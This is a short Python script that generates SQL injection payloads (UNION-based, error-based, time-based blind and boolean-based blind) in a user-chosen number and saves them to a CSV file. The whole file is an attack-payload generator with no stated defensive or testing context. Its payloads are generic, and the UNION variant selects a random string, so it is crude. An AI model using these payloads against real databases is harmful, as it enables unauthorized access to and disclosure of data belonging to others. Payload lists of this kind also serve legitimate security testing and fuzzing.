import csv
import random
import string

# Function to generate random strings for SQL injection payloads
def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Function to generate SQL injection payloads with various techniques
def generate_sql_payloads(num_payloads):
    payloads = []
    
    for _ in range(num_payloads):
        # Generate a random payload type (e.g., UNION-based, error-based, time-based)
        payload_type = random.choice(["UNION", "ERROR", "TIME", "BOOLEAN"])
        
        if payload_type == "UNION":
            # UNION-based SQL injection payload
            payload = f"' UNION SELECT {generate_random_string(5)} --"
        elif payload_type == "ERROR":
            # Error-based SQL injection payload
            payload = f"' AND 1=CONVERT(int, (SELECT @@version)) --"
        elif payload_type == "TIME":
            # Time-based blind SQL injection payload
            payload = f"' AND IF(1=1, SLEEP(5), 0) --"
        else:
            # Boolean-based blind SQL injection payload
            payload = f"' AND 1=1 --"
        
        payloads.append(payload)
    
    return payloads

# Function to save payloads to a CSV file
def save_payloads_to_csv(payloads, filename):
    with open(filename, 'w', newline='') as csvfile:
        csv_writer = csv.writer(csvfile)
        csv_writer.writerow(['Payload'])
        csv_writer.writerows([(payload,) for payload in payloads])

# Main function
def main():
    num_payloads = int(input("Enter the number of payloads to generate: "))
    csv_filename = input("Enter the CSV file path to save the payloads (e.g., 'payloads.csv'): ")
    payloads = generate_sql_payloads(num_payloads)
    save_payloads_to_csv(payloads, csv_filename)
    print(f'{num_payloads} SQL injection payloads saved to {csv_filename}')

if __name__ == '__main__':
    main()
